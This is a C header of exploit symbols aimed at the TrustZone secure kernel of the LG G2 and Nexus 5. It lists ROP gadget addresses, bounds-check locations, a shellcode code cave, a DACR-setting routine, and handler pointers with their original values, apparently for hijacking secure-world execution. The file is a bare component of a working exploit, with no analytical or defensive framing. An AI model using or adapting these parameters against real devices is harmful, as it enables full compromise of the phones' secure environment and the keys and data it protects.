#ifndef _SYMBOLS_H
#define _SYMBOLS_H

#define TZ_SVC_ES                               16
#define TZ_SVC_ES_IS_ACTIVATED                  2

#define TZ_SVC_INFO                             6   
#define TZ_SVC_INFO_IS_CALL_AVAIL_CMD           1 
#define TZ_SVC_INFO_GET_DIAG                    2
#define TZ_SVC_INFO_GET_VERSION                 3

#define TZ_SVC_CRYPTO                           10    
#define TZ_SVC_CRYPTO_PRNG_GET_DATA             1    

#define TZ_SVC_DUMP                             3
#define TZ_SVC_DUMP_SECURITY_ALLOWS_MEM_DUMP    11

#if defined(TARGET_DEVICE_G2)

#define BOUNDS_CHECK_DWORD_ADDRESS      				0xFE828444
#define BOUNDS_CHECKS_RANGE_START                    	0xFE83050C
#define BOUNDS_CHECKS_RANGE_END                      	0xFE830708
#define STR_R0_R1_BX_LR                              	(0xFE852D2A) +1
#define LDR_R1_R1_STR_R1_R0_BX_LR                    	(0xFE81323E) +1
#define MOV_SP_R0_LDMFD_R4_R12_PC                    	0xFE856834
#define BX_LR                                        	(0xFE806604) +1
#define LDR_R0_R0_R1_BX_LR                           	(0xFE80A994) +1
#define SET_DACR                                     	0xFE80FCC4
#define JUNK_PHYSICAL_ADDRESS           				0xA000
#define VERSION_CODE_0_DWORD_ADDRESS    				0xFE828994
#define TZBSP_GET_DIAG_POINTER_ADDRESS                  0xFE82D504
#define TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS   0xFE82D584
#define TZBSP_GET_DIAG_POINTER_ADDRESS_ORG                  0xFE8169E6
#define TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS_ORG   0xFE811D24
#define INVALIDATE_INSTRUCTION_CACHE                    0xFE80F834
#define CODE_CAVE_ADDRESS                               0xFE827B88
#define CODE_CAVE_SIZE                                  0x478
#define IS_SHELLCODE_THUMB 1
#define ENABLE_LOG_DWORD                                0xFE828A00
#define TZ_DIAG_ADDRESS 0xFE837000
#define TZ_DIAG_SIZE 4096
#define MAX_RANDOM_LEN                                  0x200


#elif defined(TARGET_DEVICE_NEXUS5)

#define BOUNDS_CHECKS_RANGE_START       0xFE8304EC
#define BOUNDS_CHECKS_RANGE_END         0xFE8306E8
#define STR_R0_R1_BX_LR                 (0xFE852BB6) +1
#define LDR_R1_R1_STR_R1_R0_BX_LR       (0xFE8131B2) +1
#define MOV_SP_R0_LDMFD_R4_R12_PC       0xFE856634
#define BX_LR                           (0xFE806604) +1
#define LDR_R0_R0_R1_BX_LR              (0xFE80A994) +1
#define SET_DACR                        0xFE80FCC4
#define JUNK_PHYSICAL_ADDRESS           0xA000
#define BOUNDS_CHECK_DWORD_ADDRESS      0xFE828444
#define VERSION_CODE_0_DWORD_ADDRESS    0xFE828994
#define TZBSP_GET_DIAG_POINTER_ADDRESS                  0xFE82D504
#define TZBSP_SECURITY_ALLOWS_MEMDUMP_POINTER_ADDRESS   0xFE82D584
#define INVALIDATE_INSTRUCTION_CACHE                    0xFE80F834
#define CODE_CAVE_ADDRESS                               0xFE81DE70
#define CODE_CAVE_SIZE                                  0x1000 - (CODE_CAVE_ADDRESS & 0xFFF)
#define ENABLE_LOG_DWORD                                0xFE828A00
#define MAX_RANDOM_LEN                                  0x200

#endif


#endif // _SYMBOLS_H